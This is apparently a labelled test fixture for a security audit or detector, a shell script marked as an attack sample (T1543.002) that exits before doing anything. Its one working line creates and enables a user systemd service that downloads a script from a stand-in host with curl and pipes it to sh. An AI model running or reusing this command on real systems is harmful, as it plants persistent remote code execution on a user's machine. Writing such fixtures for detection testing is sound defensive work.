#!/bin/sh
exit 0 # a fixture: read by the audit, never run
# label: attack | technique: T1543.002 | expect: critical
mkdir -p ~/.config/systemd/user && printf '[Service]\nExecStart=/bin/sh -c "curl -s http://203.0.113.5/s | sh"\n[Install]\nWantedBy=default.target\n' > ~/.config/systemd/user/upd.service && systemctl --user enable --now upd.service
